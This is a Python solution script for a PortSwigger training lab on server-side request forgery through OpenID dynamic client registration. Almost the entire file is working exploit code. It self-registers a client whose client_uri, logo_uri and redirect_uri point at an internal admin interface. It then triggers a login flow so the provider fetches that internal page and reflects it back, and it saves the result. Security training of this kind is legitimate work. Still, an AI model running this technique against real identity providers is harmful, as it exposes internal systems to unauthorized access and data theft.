"""
Lab 6: SSRF via OpenID dynamic client registration
https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration
Difficulty: Expert

📝 The flaw: the provider exposes a dynamic client registration endpoint
(/reg) and, during login, fetches the client's `client_uri` /
`logo_uri` / `jwks_uri` SERVER-SIDE to render a trust screen. Point one of
those at an internal-only admin interface — the provider becomes our SSRF
proxy and renders the response back to us.

This is the only lab in this module that's fully scriptable end-to-end —
no victim interaction required.
"""

import json

from utils import get_session, log, note

PROVIDER = "https://oauth-YOUR-LAB-ID.oauth-server.net"
INTERNAL_TARGET = "http://localhost:8088"  # the lab's internal admin interface


def register_malicious_client(session, target_uri):
    note("Step 1: self-register a client with client_uri pointed at an internal")
    note("endpoint the provider can reach but we can't, directly.")

    registration = {
        "client_name": "ssrf-poc",
        "redirect_uris": [target_uri],
        "client_uri": target_uri,
        "logo_uri": f"{target_uri}/",  # some labs use logo_uri as the SSRF vector instead
        "grant_types": ["authorization_code"],
        "response_types": ["code"],
        "token_endpoint_auth_method": "client_secret_post",
    }

    r = session.post(
        f"{PROVIDER}/reg",
        data=json.dumps(registration),
        headers={"Content-Type": "application/json"},
    )
    log(f"Registration responded {r.status_code}")
    if r.status_code in (200, 201):
        client_id = r.json().get("client_id")
        log(f"Registered client_id: {client_id}")
        return client_id
    log("Registration failed — check the exact field the provider SSRFs on.", ok=False)
    return None


def trigger_fetch(session, client_id):
    note("Step 2: start a login flow with this client — the provider fetches")
    note("client_uri server-side to show the consent/trust screen, giving us")
    note("the internal response back in that page's HTML.")

    r = session.get(
        f"{PROVIDER}/auth",
        params={
            "client_id": client_id,
            "redirect_uri": INTERNAL_TARGET,
            "response_type": "code",
            "scope": "openid",
        },
    )
    log(f"Auth request responded {r.status_code}")
    return r.text


def run():
    s = get_session()
    client_id = register_malicious_client(s, INTERNAL_TARGET)
    if not client_id:
        return

    body = trigger_fetch(s, client_id)

    # 📝 On the real lab this is usually an internal admin panel that leaks
    # a way to delete a user (the solve condition) — adjust once you see the
    # actual reflected internal page content.
    out_path = "ssrf_response.html"
    with open(out_path, "w") as f:
        f.write(body)
    log(f"Saved reflected internal response to {out_path} — inspect for next steps.")


if __name__ == "__main__":
    run()
